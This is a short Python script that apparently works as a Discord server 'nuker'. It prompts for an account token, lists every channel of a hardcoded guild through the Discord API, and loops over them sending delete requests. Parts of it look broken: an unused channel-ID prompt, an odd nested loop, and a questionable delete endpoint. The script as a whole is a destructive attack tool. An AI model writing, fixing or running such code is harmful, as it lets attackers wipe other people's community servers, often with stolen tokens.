from colorama import Fore, Style, init
init(convert=True)
import requests
import time

red = Fore.RED + Style.BRIGHT
green = Fore.GREEN + Style.BRIGHT
blue = Fore.BLUE + Style.BRIGHT
white = Fore.WHITE

def delete_channels():
    token = input(f"{blue}[{white}S{blue}]{white} Enter token: ")
    channel_ID = input(f"{blue}[{white}S{blue}]{white} Enter channel ID: ")
    headers = {
        "Authorization": token,
        "Content-Type": "application/json",
    }
    channelIDs = requests.get("https://discord.com/api/v9/guilds/1132072878263762994/channels", headers=headers).json()
    for channel in [channelIDs[amount : amount + 3] for amount in range(0, len(channelIDs), 3)]:
        for channel in channel:
                try:
                    requests.delete(f'https://discord.com/api/v9/guilds/1132072878263762994/channels/'+channel['id']+'',headers=headers)
                except Exception as err:
                    print(f'{red} Oopsie poopsie! An error has occured: {err}')
        


delete_channels()